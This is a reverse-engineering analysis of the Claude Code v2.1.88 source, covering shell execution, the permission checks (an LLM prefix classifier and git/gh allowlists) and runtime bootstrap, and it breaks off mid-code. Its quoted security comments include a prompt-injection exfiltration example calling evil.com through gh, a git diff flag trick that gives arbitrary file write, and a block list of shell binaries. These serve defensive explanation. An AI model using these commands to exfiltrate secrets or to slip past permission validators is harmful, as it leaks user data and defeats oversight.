# Claude Code v2.1.88: Shell Detection/Execution & Entrypoints Deep Dive

**Reverse-Engineering Analysis: How Anthropic Engineered Shell Isolation, Permission Validation, and Runtime Bootstrap**

**Date**: 2026-04-02
**Source Scope**: 7,860 LOC across 3 directories
**File Coverage**: 20 source files (TS/TSX) analyzed end-to-end

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Shell Detection & Execution Subsystem](#shell-detection--execution-subsystem)
3. [Entrypoints Architecture](#entrypoints-architecture)
4. [Upstream Proxy System](#upstream-proxy-system)
5. [Security & Design Patterns](#security--design-patterns)

---

## Executive Summary

Claude Code v2.1.88 implements a **dual-shell architecture** supporting both POSIX shells (bash, zsh) and PowerShell with shell-specific command construction, environment isolation, and permission validation. The system:

- **Detects active shells** via `$SHELL`, binary probing (PATH resolution), and fallback defaults
- **Isolates execution** using snapshot-based state restoration, sandbox-aware TMPDIR handling, and tmux socket isolation
- **Validates commands** via two-tier permission checks: (1) Haiku LLM prefix extraction (2) hardcoded git/gh command allowlists
- **Bootstraps runtime** through a centralized `init()` function managing proxy, mTLS, scratchpad, OAuth, and remote settings
- **Exposes three entrypoints**: `init.ts` (runtime bootstrap), `agentSdkTypes.ts` (SDK exports), `mcp.ts` (MCP server mode)
- **Injects credentials** via CCR upstreamproxy relay — CONNECT-over-WebSocket tunnel with protobuf-encoded chunks, auth header injection, and NO_PROXY bypass lists

The architecture prioritizes **fail-open resilience** (proxy/mTLS errors don't break sessions) and **cross-platform compatibility** (Windows Git Bash, macOS/Linux, WSL2 sandbox modes).

---

## Shell Detection & Execution Subsystem

### Architecture Overview

```
┌─────────────────────────────────────────────────────┐
│  Shell Provider Interface (ShellProvider type)      │
├─────────────────────────────────────────────────────┤
│  - type: 'bash' | 'powershell'                      │
│  - shellPath: string (executable path)              │
│  - detached: boolean (process model)                │
│  - buildExecCommand(...) → commandString + cwdPath  │
│  - getSpawnArgs(cmd) → string[]                     │
│  - getEnvironmentOverrides(cmd) → env vars          │
└─────────────────────────────────────────────────────┘
           ↓
    ┌─────────────────────────────────────────┐
    │  Bash Provider                          │
    │  (createBashShellProvider)              │
    ├─────────────────────────────────────────┤
    │  • Snapshot creation (ShellSnapshot.ts) │
    │  • Session env sourcing                 │
    │  • Extended glob disabling              │
    │  • pwd tracking to file                 │
    │  • Tmux socket isolation                │
    └─────────────────────────────────────────┘
           ↓
    ┌─────────────────────────────────────────┐
    │  PowerShell Provider                    │
    │  (createPowerShellProvider)             │
    ├─────────────────────────────────────────┤
    │  • -NoProfile -NonInteractive flags     │
    │  • Exit code via $LASTEXITCODE/$?       │
    │  • Base64-UTF16LE encoding              │
    │  • Sandbox-aware TMPDIR                 │
    └─────────────────────────────────────────┘
```

### 1. Shell Detection

#### Resolution Order (resolveDefaultShell.ts)

```typescript
export function resolveDefaultShell(): 'bash' | 'powershell' {
  return getInitialSettings().defaultShell ?? 'bash'
}
```

**Platform Default**: All platforms default to `bash` — Windows users with WSL/Git Bash are not auto-flipped to PowerShell (preserves existing shell hook compatibility).

**Resolution Chain**:
1. Check `settings.defaultShell` (JSON config)
2. Fall back to `'bash'` (no auto-platform-specific defaults)

**Key Design Decision**: The docs reference `docs/design/ps-shell-selection.md §4.2` for rationale — backwards compatibility takes precedence over platform conventions.

#### PowerShell Detection (powershellDetection.ts)

**Binary Search Algorithm**:
1. Try `which pwsh` (PowerShell 7+ preferred)
2. On Linux: detect snap launcher `/snap/...` and bypass to direct binary
   - Check `/opt/microsoft/powershell/7/pwsh` (direct install)
   - Check `/usr/bin/pwsh` (fallback)
3. Fall back to `which powershell` (Windows PowerShell 5.1)
4. Return `null` if neither found

**Snap Launcher Problem**:
- Snap wrapper (`/snap/bin/pwsh`) hangs in subprocesses during snapd initialization
- Solution: Probe resolved symlink (`realpath`) and prefer `/opt/microsoft/...` if available
- Code: Lines 31–46 check both `pwshPath.startsWith('/snap/')` AND `realpath()` result

**Edition Detection** (getPowerShellEdition):
- Binary name → edition mapping (no spawning needed)
  - `pwsh` / `pwsh.exe` → `'core'` (7+, supports `&&`, `||`, `?:`, `??`)
  - `powershell` / `powershell.exe` → `'desktop'` (5.1, legacy, stderr-sets-$? bug)
- Used by prompt to avoid emitting 5.1-incompatible syntax to the model

**Caching**: `getCachedPowerShellPath()` memoizes first detection; reset via `resetPowerShellCache()` for tests.

### 2. Bash Provider Deep Dive (bashProvider.ts: 255 lines)

#### Snapshot-Based State Restoration

Bash commands execute with full shell initialization via **ShellSnapshot** — a saved environment state that captures:
- Session variables from login shell
- Function definitions
- Alias definitions
- Other shell state

**Initialization Flow**:
```typescript
const snapshotPromise = options?.skipSnapshot
  ? Promise.resolve(undefined)
  : createAndSaveSnapshot(shellPath).catch(error => {
      logForDebugging(`Failed to create shell snapshot: ${error}`)
      return undefined
    })
```

**Why Snapshots?** Without snapshots, every bash command would spawn a login shell (`-l` flag), which:
- Reads `.bashrc` / `.bash_profile` (slow, ~100–200ms per command)
- Introduces ordering dependencies (alias expansion after sourcing)
- Risk of user initialization errors breaking all commands

Snapshots cache this once per session, recovering it via `source <snapshot-file>`.

**TOCTOU Race Handling** (Lines 86–102):
```typescript
if (snapshotFilePath) {
  try {
    await access(snapshotFilePath) // Fallback decision point
  } catch {
    logForDebugging(`Snapshot file missing, falling back to login shell...`)
    snapshotFilePath = undefined
  }
}
lastSnapshotFilePath = snapshotFilePath
```
If snapshot vanishes mid-session (tmpdir cleanup), fallback to login-shell init. The `source ... || true` in the final command still guards the race window.

#### Command Assembly Pipeline

**Step 1: Normalize Windows CMD Redirects**
```typescript
const normalizedCommand = rewriteWindowsNullRedirect(command)
// Converts: `cmd 2>nul` → `cmd 2>/dev/null` (Git Bash fix)
```
Model sometimes emits `2>nul` (Windows CMD syntax); in POSIX bash, this creates a literal file `nul` (reserved name) that breaks git. Proactive rewrite.

**Step 2: Add Stdin Redirect**
```typescript
const addStdinRedirect = shouldAddStdinRedirect(normalizedCommand)
let quotedCommand = quoteShellCommand(normalizedCommand, addStdinRedirect)
```
Adds `< /dev/null` to prevent commands waiting on stdin. Example: `rg foo | wc -l < /dev/null` ensures `wc` reads 0 from `/dev/null`, not the inherited pipe.

**Step 3: Rearrange Pipe Redirects** (Lines 145–154)
```typescript
if (normalizedCommand.includes('|') && addStdinRedirect) {
  quotedCommand = rearrangePipeCommand(normalizedCommand)
}
// Before: `eval 'rg foo | wc -l' \< /dev/null` (redirect on eval)
// After:  `eval 'rg foo \< /dev/null | wc -l'` (redirect on first cmd)
```

**Step 4: Assemble Final Command**
```typescript
const commandParts: string[] = []

// 1. Source snapshot (if exists)
if (snapshotFilePath) {
  commandParts.push(`source ${quote([finalPath])} 2>/dev/null || true`)
}

// 2. Source session environment (from /env captures at startup)
const sessionEnvScript = await getSessionEnvironmentScript()
if (sessionEnvScript) {
  commandParts.push(sessionEnvScript)
}

// 3. Disable extended globs (security)
const disableExtglobCmd = getDisableExtglobCommand(shellPath)
if (disableExtglobCmd) {
  commandParts.push(disableExtglobCmd)
}

// 4. Eval the user command (second parse pass for alias expansion)
commandParts.push(`eval ${quotedCommand}`)

// 5. Capture working directory
commandParts.push(`pwd -P >| ${quote([shellCwdFilePath])}`)

let commandString = commandParts.join(' && ')

// 6. Apply CLAUDE_CODE_SHELL_PREFIX if set (wrapper shell)
if (process.env.CLAUDE_CODE_SHELL_PREFIX) {
  commandString = formatShellPrefixCommand(
    process.env.CLAUDE_CODE_SHELL_PREFIX,
    commandString,
  )
}
```

**Extended Glob Disabling** (getDisableExtglobCommand):
```typescript
// When CLAUDE_CODE_SHELL_PREFIX is set (wrapper shell may differ from shellPath)
if (process.env.CLAUDE_CODE_SHELL_PREFIX) {
  return '{ shopt -u extglob || setopt NO_EXTENDED_GLOB; } >/dev/null 2>&1 || true'
}

// For bash specifically
if (shellPath.includes('bash')) {
  return 'shopt -u extglob 2>/dev/null || true'
}
// For zsh specifically
else if (shellPath.includes('zsh')) {
  return 'setopt NO_EXTENDED_GLOB 2>/dev/null || true'
}
```

**Rationale**: Extended globs can be exploited via malicious filenames that expand AFTER security validation. Example: `*(foo)` expands to all files matching the pattern; a file named `..` could escape directory traversal checks post-expansion.

#### Spawn Arguments

**Without Snapshot** (Login Shell):
```typescript
getSpawnArgs(commandString): string[] {
  const skipLoginShell = lastSnapshotFilePath !== undefined
  if (!skipLoginShell) {
    return ['-c', '-l', commandString]  // -l = login shell init
  }
  return ['-c', commandString]
}
```

**With Snapshot** (Session Init):
```typescript
// -l is omitted; snapshot supplies initialization
return ['-c', commandString]
```

#### Environment Overrides (getEnvironmentOverrides)

**Tmux Socket Isolation** (Lines 211–227):
```typescript
const commandUsesTmux = command.includes('tmux')
if (
  process.env.USER_TYPE === 'ant' &&
  (hasTmuxToolBeenUsed() || commandUsesTmux)
) {
  await ensureSocketInitialized()
}
const claudeTmuxEnv = getClaudeTmuxEnv()
const env: Record<string, string> = {}

if (claudeTmuxEnv) {
  env.TMUX = claudeTmuxEnv  // Override user's TMUX to Claude's isolated socket
}
```

**Sandbox TMPDIR Handling** (Lines 235–247):
```typescript
if (currentSandboxTmpDir) {
  let posixTmpDir = currentSandboxTmpDir
  if (getPlatform() === 'windows') {
    posixTmpDir = windowsPathToPosixPath(posixTmpDir)
  }
  env.TMPDIR = posixTmpDir
  env.CLAUDE_CODE_TMPDIR = posixTmpDir
  // Zsh uses TMPPREFIX (not TMPDIR) for heredoc temp files
  env.TMPPREFIX = posixJoin(posixTmpDir, 'zsh')
}
```

**Session Environment Variables** (Lines 248–251):
```typescript
for (const [key, value] of getSessionEnvVars()) {
  env[key] = value
}
```
Variables set via `/env` command in the session (not shell login init).

### 3. PowerShell Provider Deep Dive (powershellProvider.ts: 123 lines)

#### Command Construction (buildExecCommand)

**Working Directory Tracking**:
```typescript
const cwdTracking = `\n; $_ec = if ($null -ne $LASTEXITCODE) { $LASTEXITCODE } elseif ($?) { 0 } else { 1 }\n; (Get-Location).Path | Out-File -FilePath '${escapedCwdFilePath}' -Encoding utf8 -NoNewline\n; exit $_ec`
const psCommand = command + cwdTracking
```

**Exit Code Recovery** (Lines 55–65):
- Prefer `$LASTEXITCODE` (native executable exit code)
- Fall back to `$?` (PowerShell cmdlet result)
- Rationale: PS 5.1 stderr-redirection bug — native exe outputting to stderr sets `$? = $false` even when exit code is 0
- **Tradeoff**: `native-ok; cmdlet-fail` → returns 0 (was 1); `native-fail; cmdlet-ok` → returns native code (was 0)

**Sandbox Path Handling** (Lines 86–94):
```typescript
const commandString = opts.useSandbox
  ? [
      `'${shellPath.replace(/'/g, `'\\''`)}'`,  // POSIX-quoted path
      '-NoProfile',
      '-NonInteractive',
      '-EncodedCommand',
      encodePowerShellCommand(psCommand),  // Base64 UTF-16LE
    ].join(' ')
  : psCommand
```

**Why -EncodedCommand with Base64?**
- Sandbox runtime applies its own `shellquote.quote()` on top
- Single-quote triggers double-quote mode → `!$?` becomes `\!$?` (literal backslash)
- Base64 is `[A-Za-z0-9+/=]` only — no chars any quoting layer can corrupt
- Avoids `Command: $(malicious-substitution)` injection

**Base64 Encoding**:
```typescript
function encodePowerShellCommand(psCommand: string): string {
  return Buffer.from(psCommand, 'utf16le').toString('base64')
}
```
UTF-16LE (not UTF-8) because PowerShell's `-EncodedCommand` expects UTF-16LE wire format.

#### Spawn Arguments

**Minimal Flag Set**:
```typescript
getSpawnArgs(commandString: string): string[] {
  return buildPowerShellArgs(commandString)
}

export function buildPowerShellArgs(cmd: string): string[] {
  return ['-NoProfile', '-NonInteractive', '-Command', cmd]
}
```

- `-NoProfile`: Skip user profile scripts (avoids user errors, speeds up spawn)
- `-NonInteractive`: No `$host.ui` prompts (fail immediately if input needed)
- `-Command`: Execute the command string

#### Environment Overrides

**Session Variables** (Lines 112–114):
```typescript
for (const [key, value] of getSessionEnvVars()) {
  env[key] = value
}
```
Ordering: session vars FIRST so sandbox TMPDIR can't be overridden by `/env TMPDIR=...`.

**Sandbox TMPDIR** (Lines 115–119):
```typescript
if (currentSandboxTmpDir) {
  env.TMPDIR = currentSandboxTmpDir
  env.CLAUDE_CODE_TMPDIR = currentSandboxTmpDir
}
```
PowerShell on Linux/macOS honors TMPDIR for `[System.IO.Path]::GetTempPath()`.

### 4. Command Prefix Extraction

Two-tier validation system: **Haiku LLM + Hardcoded Allowlists**

#### Tier 1: Haiku Prefix Extraction (prefix.ts: 367 lines)

**Factory Pattern** (createCommandPrefixExtractor):
```typescript
export function createCommandPrefixExtractor(config: PrefixExtractorConfig) {
  const memoized = memoizeWithLRU(
    (command: string, abortSignal: AbortSignal, isNonInteractiveSession: boolean) => {
      const promise = getCommandPrefixImpl(...)
      // Evict on rejection to prevent aborted calls from poisoning cache
      promise.catch(() => {
        if (memoized.cache.get(command) === promise) {
          memoized.cache.delete(command)
        }
      })
      return promise
    },
    command => command,  // memoize key
    200,  // LRU size
  )
  return memoized
}
```

**Two-Layer Memoization**:
1. Outer memoized function creates the promise
2. `.catch()` handler evicts stale entries on rejection
3. Bounded to 200 entries to prevent unbounded growth

**Haiku Query Structure** (Lines 215–242):
```typescript
const useSystemPromptPolicySpec = getFeatureValue_CACHED_MAY_BE_STALE('tengu_cork_m4q', false)

const response = await queryHaiku({
  systemPrompt: asSystemPrompt(
    useSystemPromptPolicySpec
      ? [`Your task is to process ${toolName} commands...\n\n${policySpec}`]
      : [`Your task is to process ${toolName} commands...\n\n${policySpec}`],  // Different framing
  ),
  userPrompt: useSystemPromptPolicySpec
    ? `Command: ${command}`
    : `${policySpec}\n\nCommand: ${command}`,
  signal: abortSignal,
  options: {
    enablePromptCaching: useSystemPromptPolicySpec,  // Cache policy spec in system prompt
    querySource,
    agents: [],
    isNonInteractiveSession,
    hasAppendSystemPrompt: false,
    mcpTools: [],
  },
})
```

**Key Feature Gate**: `tengu_cork_m4q` (GrowthBook) controls:
- System prompt placement (faster, cacheable vs. user prompt)
- Prompt caching enablement
- Different framing for same task

**Response Validation** (Lines 248–323):
```typescript
const prefix = typeof response.message.content === 'string'
  ? response.message.content
  : Array.isArray(response.message.content)
    ? (response.message.content.find(_ => _.type === 'text')?.text ?? 'none')
    : 'none'

if (startsWithApiErrorPrefix(prefix)) {
  logEvent(eventName, { success: false, error: 'API error', durationMs })
  result = null
} else if (prefix === 'command_injection_detected') {
  logEvent(eventName, { success: false, error: 'command_injection_detected', durationMs })
  result = { commandPrefix: null }
} else if (prefix === 'git' || DANGEROUS_SHELL_PREFIXES.has(prefix.toLowerCase())) {
  logEvent(eventName, { success: false, error: 'dangerous_shell_prefix', durationMs })
  result = { commandPrefix: null }
} else if (prefix === 'none') {
  logEvent(eventName, { success: false, error: 'prefix "none"', durationMs })
  result = { commandPrefix: null }
} else if (!command.startsWith(prefix)) {
  logEvent(eventName, { success: false, error: 'command did not start with prefix', durationMs })
  result = { commandPrefix: null }
} else {
  logEvent(eventName, { success: true, durationMs })
  result = { commandPrefix: prefix }
}
```

**Dangerous Shell Prefixes** (Lines 28–44):
```typescript
const DANGEROUS_SHELL_PREFIXES = new Set([
  'sh', 'bash', 'zsh', 'fish', 'csh', 'tcsh', 'ksh', 'dash',
  'cmd', 'cmd.exe', 'powershell', 'powershell.exe', 'pwsh', 'pwsh.exe', 'bash.exe',
])
```
Reject bare shell executables (would defeat permission system).

**10-Second Timeout** (Lines 199–212):
```typescript
let preflightCheckTimeoutId: NodeJS.Timeout | undefined
const startTime = Date.now()

preflightCheckTimeoutId = setTimeout((tn, nonInteractive) => {
  const message = `[${tn}Tool] Pre-flight check is taking longer than expected...`
  if (nonInteractive) {
    process.stderr.write(jsonStringify({ level: 'warn', message }) + '\n')
  } else {
    console.warn(chalk.yellow(`⚠️  ${message}`))
  }
}, 10000, toolName, isNonInteractiveSession)
```

#### Tier 2: Hardcoded Command Allowlists (readOnlyCommandValidation.ts: 1,893 lines)

**Map-Based Authorization**:
```typescript
export type ExternalCommandConfig = {
  safeFlags: Record<string, FlagArgType>
  additionalCommandIsDangerousCallback?: (
    rawCommand: string,
    args: string[],
  ) => boolean
  respectsDoubleDash?: boolean  // Default: true
}

export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
  'git diff': { safeFlags: { ... } },
  'git log': { safeFlags: { ... } },
  // ... ~30 git subcommands
}

export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
  'gh pr view': { safeFlags: { ... } },
  'gh pr list': { safeFlags: { ... } },
  // ... ~15 gh subcommands (ant-only)
}
```

**Flag Types**:
```typescript
type FlagArgType =
  | 'none'      // --color, -n (no argument)
  | 'number'    // --context=3 (integer)
  | 'string'    // --relative=path (arbitrary string)
  | 'char'      // Single character (delimiter)
  | '{}'        // Literal "{}" only
  | 'EOF'       // Literal "EOF" only
```

**Security-Critical Examples**:

1. **git diff -S/-G/-O** (Lines 162–171):
```typescript
// SECURITY: -S/-G/-O take REQUIRED string arguments.
// Previously 'none' caused parser differential:
//   `git diff -S -- --output=/tmp/pwned`
// Validator saw -S as no-arg → advances 1 token → breaks on `--` → --output unchecked
// git saw -S requires arg → consumes `--` as the pickaxe string → --output is a long option → ARBITRARY FILE WRITE
// git log config correctly has -S/-G as 'string'
'-S': 'string',
'-G': 'string',
'-O': 'string',
```

2. **git tag / git branch Creation Block** (Lines 739–805 for git tag):
```typescript
// SECURITY: Block tag creation via positional arguments.
// `git tag foo` creates .git/refs/tags/foo (41-byte file write) — NOT read-only.
// Without this callback, validateFlags's default positional-arg fallthrough
// accepts `mytag` as a non-flag arg, and git tag auto-approves.
additionalCommandIsDangerousCallback: (_rawCommand: string, args: string[]) => {
  // Safe: `git tag` (list), `git tag -l pattern`, `git tag --contains <ref>`
  // Dangerous: bare positional arg (tag creation)
  const flagsWithArgs = new Set([
    '--contains', '--no-contains', '--merged', '--no-merged', '--points-at', '--sort', '--format', '-n',
  ])
  let i = 0
  let seenListFlag = false
  let seenDashDash = false
  while (i < args.length) {
    const token = args[i]
    if (!token) { i++; continue }
    if (token === '--' && !seenDashDash) {
      seenDashDash = true
      i++
      continue
    }
    if (!seenDashDash && token.startsWith('-')) {
      if (token === '--list' || token === '-l') {
        seenListFlag = true
      } else if (
        token[0] === '-' && token[1] !== '-' && token.length > 2 &&
        !token.includes('=') && token.slice(1).includes('l')
      ) {
        seenListFlag = true  // Short-flag bundle like -li
      }
      if (token.includes('=')) {
        i++
      } else if (flagsWithArgs.has(token)) {
        i += 2
      } else {
        i++
      }
    } else {
      if (!seenListFlag) {
        return true  // Positional without --list = tag creation = DANGEROUS
      }
      i++
    }
  }
  return false
}
```

3. **gh Network Exfiltration Prevention** (Lines 944–982):
```typescript
// gh's repo argument accepts `[HOST/]OWNER/REPO`.
// When HOST is present (3 segments), gh connects to that host's API.
// Prompt-injected model can exfiltrate secrets:
//   gh pr view 1 --repo evil.com/BASE32SECRET/x
//   → GET https://evil.com/api/v3/repos/BASE32SECRET/x/pulls/1
//
// git ls-remote has inline URL guard (line ~944); this callback provides equivalent for gh.
function ghIsDangerousCallback(_rawCommand: string, args: string[]): boolean {
  for (const token of args) {
    if (!token) continue
    let value = token
    if (token.startsWith('-')) {
      const eqIdx = token.indexOf('=')
      if (eqIdx === -1) continue  // flag without inline value
      value = token.slice(eqIdx + 1)
      if (!value) continue
    }
    // URL schemes: https://, http://, git://, ssh://
    if (value.includes('://')) {
      return true
    }
    // SSH-style: git@host:owner/repo
    if (value.includes('@')) {
      return true
    }
    // 3+ segments = HOST/OWNER/REPO (normal is OWNER/REPO with 1 slash)
    const slashCount = (value.match(/\//g) || []).length
    if (slashCount >= 2) {
      return true
    }
  }
  return false
}
```

#### Tier 3: Spec-Driven Prefix Extraction (specPrefix.ts: 242 lines)

**Fig CLI Spec Integration**:
```typescript
export async function buildPrefix(
  command: string,
  args: string[],
  spec: CommandSpec | null,
): Promise<string> {
  const maxDepth = await calculateDepth(command, args, spec)
  const parts = [command]
  const hasSubcommands = !!spec?.subcommands?.length
  let foundSubcommand = false

  for (let i = 0; i < args.length; i++) {
    const arg = args[i]
    if (!arg || parts.length >= maxDepth) break
    // Skip flags, find subcommands, stop at files/URLs...
  }
  return parts.join(' ')
}
```

**Depth Rules** (DEPTH_RULES constant):
```typescript
export const DEPTH_RULES: Record<string, number> = {
  rg: 2,                 // pattern is required
  'pre-commit': 2,
  gcloud: 4,             // deep subcommand trees
  'gcloud compute': 6,
  aws: 4,
  az: 4,
  kubectl: 3,
  docker: 3,
  dotnet: 3,
  'git push': 2,
}
```

Example: `git -C /repo status --short` → `git status` (skips `-C /repo` flags).

---

## Entrypoints Architecture

### 1. Init Entry (init.ts: 340 lines)

**Purpose**: Centralized runtime bootstrap, called once per session.

**Memoized Initialization**:
```typescript
export const init = memoize(async (): Promise<void> => {
  const initStartTime = Date.now()
  logForDiagnosticsNoPII('info', 'init_started')
  profileCheckpoint('init_function_start')

  // ... initialization sequence
})
```
Uses lodash `memoize()` to ensure single execution across multi-turn sessions.

#### Initialization Sequence

**Phase 1: Configuration & Safe Environment** (Lines 62–84)
```typescript
const configsStart = Date.now()
enableConfigs()  // Validate settings.json, enable config system

const envVarsStart = Date.now()
applySafeConfigEnvironmentVariables()  // Only safe vars before trust dialog
applyExtraCACertsFromConfig()  // NODE_EXTRA_CA_CERTS for BoringSSL before first TLS

setupGracefulShutdown()  // Register cleanup handlers
```

**Phase 2: Async Feature Initialization** (Lines 94–129)
```typescript
// 1P Event Logging (deferred)
void Promise.all([
  import('../services/analytics/firstPartyEventLogger.js'),
  import('../services/analytics/growthbook.js'),
])

// OAuth account info population
void populateOAuthAccountInfoIfNeeded()

// JetBrains IDE detection
void initJetBrainsDetection()

// GitHub repository detection
void detectCurrentRepository()

// Remote-managed settings loading promise initialization
if (isEligibleForRemoteManagedSettings()) {
  initializeRemoteManagedSettingsLoadingPromise()
}
if (isPolicyLimitsEligible()) {
  initializePolicyLimitsLoadingPromise()
}
```

**Phase 3: Network & Proxy** (Lines 134–159)
```typescript
const mtlsStart = Date.now()
configureGlobalMTLS()  // TLS client cert setup (if configured)

const proxyStart = Date.now()
configureGlobalAgents()  // HTTP/HTTPS agents with proxy

preconnectAnthropicApi()  // TCP+TLS handshake warming (fire-and-forget)
```

**Phase 4: CCR Upstream Proxy** (Lines 167–183)
```typescript
if (isEnvTruthy(process.env.CLAUDE_CODE_REMOTE)) {
  try {
    const { initUpstreamProxy, getUpstreamProxyEnv } = await import(
      '../upstreamproxy/upstreamproxy.js'
    )
    const { registerUpstreamProxyEnvFn } = await import(
      '../utils/subprocessEnv.js'
    )
    registerUpstreamProxyEnvFn(getUpstreamProxyEnv)
    await initUpstreamProxy()
  } catch (err) {
    logForDebugging(`[init] upstreamproxy init failed: ${err.message}; continuing without proxy`, { level: 'warn' })
  }
}
```
Fails open — proxy errors don't break sessions.

**Phase 5: Platform & Filesystem** (Lines 185–209)
```typescript
setShellIfWindows()  // Git Bash auto-detection on Windows

registerCleanup(shutdownLspServerManager)
registerCleanup(async () => {
  const { cleanupSessionTeams } = await import('../utils/swarm/teamHelpers.js')
  await cleanupSessionTeams()
})

if (isScratchpadEnabled()) {
  const scratchpadStart = Date.now()
  await ensureScratchpadDir()
}
```

**Error Handling** (Lines 215–237):
```typescript
} catch (error) {
  if (error instanceof ConfigParseError) {
    if (getIsNonInteractiveSession()) {
      process.stderr.write(`Configuration error in ${error.filePath}: ${error.message}\n`)
      gracefulShutdownSync(1)
      return
    }
    // Interactive: show dialog
    return import('../components/InvalidConfigDialog.js').then(m =>
      m.showInvalidConfigDialog({ error }),
    )
  } else {
    throw error  // Non-config errors are fatal
  }
}
```

#### Telemetry Initialization (Lines 247–303)

**Deferred Initialization**:
```typescript
export function initializeTelemetryAfterTrust(): void {
  if (isEligibleForRemoteManagedSettings()) {
    // Eager init for SDK + beta tracing
    if (getIsNonInteractiveSession() && isBetaTracingEnabled()) {
      void doInitializeTelemetry().catch(...)
    }
    // Async path: wait for remote settings, then re-apply env vars, then init telemetry
    void waitForRemoteManagedSettingsToLoad()
      .then(async () => {
        applyConfigEnvironmentVariables()
        await doInitializeTelemetry()
      })
  } else {
    void doInitializeTelemetry().catch(...)
  }
}

async function doInitializeTelemetry(): Promise<void> {
  if (telemetryInitialized) return
  telemetryInitialized = true
  try {
    await setMeterState()
  } catch (error) {
    telemetryInitialized = false  // Reset on failure for retry
    throw error
  }
}

async function setMeterState(): Promise<void> {
  const { initializeTelemetry } = await import('../utils/telemetry/instrumentation.js')
  const meter = await initializeTelemetry()  // Lazy ~400KB OpenTelemetry
  if (meter) {
    const createAttributedCounter = (name: string, options: MetricOptions): AttributedCounter => {
      const counter = meter?.createCounter(name, options)
      return {
        add(value: number, additionalAttributes: Attributes = {}) {
          const currentAttributes = getTelemetryAttributes()
          const mergedAttributes = { ...currentAttributes, ...additionalAttributes }
          counter?.add(value, mergedAttributes)
        },
      }
    }
    setMeter(meter, createAttributedCounter)
    getSessionCounter()?.add(1)
  }
}
```

**Key Design**: Telemetry is **split into two phases**:
1. `init()` — validates config, sets up proxy/mTLS, inits remote settings promise
2. `initializeTelemetryAfterTrust()` — called AFTER user grants trust, waits for remote settings if eligible, then initializes OpenTelemetry

This prevents slow telemetry initialization from blocking trust dialog display.

### 2. Agent SDK Types Exports (agentSdkTypes.ts: 443 lines)

**Purpose**: Re-export public SDK API from internal modules, type-only entrypoint.

**Three Layers of Exports**:

1. **Control Protocol Types** (for SDK builders):
```typescript
export type {
  SDKControlRequest,
  SDKControlResponse,
} from './sdk/controlTypes.js'
```

2. **Core Types** (serializable):
```typescript
export * from './sdk/coreTypes.js'
// Includes: SDKMessage, SDKUserMessage, SDKResultMessage, SDKSessionInfo, etc.
```

3. **Runtime Types** (non-serializable, callbacks):
```typescript
export * from './sdk/runtimeTypes.js'
// Includes: Query, SDKSession, Tool, Agent, etc.
```

4. **Settings & Tool Types**:
```typescript
export type { Settings } from './sdk/settingsTypes.generated.js'
export * from './sdk/toolTypes.js'  // @internal until SDK API stabilizes
```

**Tool Factory Function** (Lines 73–88):
```typescript
export function tool<Schema extends AnyZodRawShape>(
  _name: string,
  _description: string,
  _inputSchema: Schema,
  _handler: (
    args: InferShape<Schema>,
    extra: unknown,
  ) => Promise<CallToolResult>,
  _extras?: {
    annotations?: ToolAnnotations
    searchHint?: string
    alwaysLoad?: boolean
  },
): SdkMcpToolDefinition<Schema> {
  throw new Error('not implemented')
}
```
Defined but not implemented in the source file — actual implementation is in the SDK runtime.

**MCP Server Factory** (Lines 103–107):
```typescript
export function createSdkMcpServer(
  _options: CreateSdkMcpServerOptions,
): McpSdkServerConfigWithInstance {
  throw new Error('not implemented')
}
```

**Session APIs** (Lines 129–165):
```typescript
export function unstable_v2_createSession(_options: SDKSessionOptions): SDKSession {
  throw new Error('unstable_v2_createSession is not implemented in the SDK')
}

export function unstable_v2_resumeSession(_sessionId: string, _options: SDKSessionOptions): SDKSession {
  throw new Error('unstable_v2_resumeSession is not implemented in the SDK')
}

export async function unstable_v2_prompt(_message: string, _options: SDKSessionOptions): Promise<SDKResultMessage> {
  throw new Error('unstable_v2_prompt is not implemented in the SDK')
}
```

**Query APIs** (Lines 178–208):
```typescript
export async function getSessionMessages(
  _sessionId: string,
  _options?: GetSessionMessagesOptions,
): Promise<SessionMessage[]> {
  throw new Error('getSessionMessages is not implemented in the SDK')
}

export async function listSessions(_options?: ListSessionsOptions): Promise<SDKSessionInfo[]> {
  throw new Error('listSessions is not implemented in the SDK')
}

export async function getSessionInfo(
  _sessionId: string,
  _options?: GetSessionInfoOptions,
): Promise<SDKSessionInfo | undefined> {
  throw new Error('getSessionInfo is not implemented in the SDK')
}
```

### 3. MCP Server Entry (mcp.ts: 196 lines)

**Purpose**: Run Claude Code as an MCP server (stdio transport).

**Architecture**:
```
┌─────────────────────────────────┐
│  MCP Server (stdio transport)   │
├─────────────────────────────────┤
│  ListToolsRequest               │
│  CallToolRequest                │
│  Tool Invocation Context        │
│  Empty Permissions (all allowed)│
└─────────────────────────────────┘
```

**Server Setup** (Lines 47–57):
```typescript
export async function startMCPServer(
  cwd: string,
  debug: boolean,
  verbose: boolean,
): Promise<void> {
  const READ_FILE_STATE_CACHE_SIZE = 100
  const readFileStateCache = createFileStateCacheWithSizeLimit(
    READ_FILE_STATE_CACHE_SIZE,
  )
  setCwd(cwd)
  const server = new Server(
    {
      name: 'claude/tengu',
      version: MACRO.VERSION,
    },
    {
      capabilities: {
        tools: {},
      },
    },
  )
```

**ListToolsRequest Handler** (Lines 59–96):
```typescript
server.setRequestHandler(
  ListToolsRequestSchema,
  async (): Promise<ListToolsResult> => {
    const toolPermissionContext = getEmptyToolPermissionContext()
    const tools = getTools(toolPermissionContext)
    return {
      tools: await Promise.all(
        tools.map(async tool => ({
          ...tool,
          description: await tool.prompt({ ... }),
          inputSchema: zodToJsonSchema(tool.inputSchema) as ToolInput,
          outputSchema: /* ... */,
        })),
      ),
    }
  },
)
```

**CallToolRequest Handler** (Lines 99–188):
```typescript
server.setRequestHandler(
  CallToolRequestSchema,
  async ({ params: { name, arguments: args } }): Promise<CallToolResult> => {
    const toolPermissionContext = getEmptyToolPermissionContext()
    const tools = getTools(toolPermissionContext)
    const tool = findToolByName(tools, name)
    if (!tool) throw new Error(`Tool ${name} not found`)

    const toolUseContext: ToolUseContext = {
      abortController: createAbortController(),
      options: {
        commands: MCP_COMMANDS,
        tools,
        mainLoopModel: getMainLoopModel(),
        thinkingConfig: { type: 'disabled' },
        mcpClients: [],
        mcpResources: {},
        isNonInteractiveSession: true,
        debug, verbose,
        agentDefinitions: { activeAgents: [], allAgents: [] },
      },
      getAppState: () => getDefaultAppState(),
      setAppState: () => {},
      messages: [],
      readFileState: readFileStateCache,
      setInProgressToolUseIDs: () => {},
      setResponseLength: () => {},
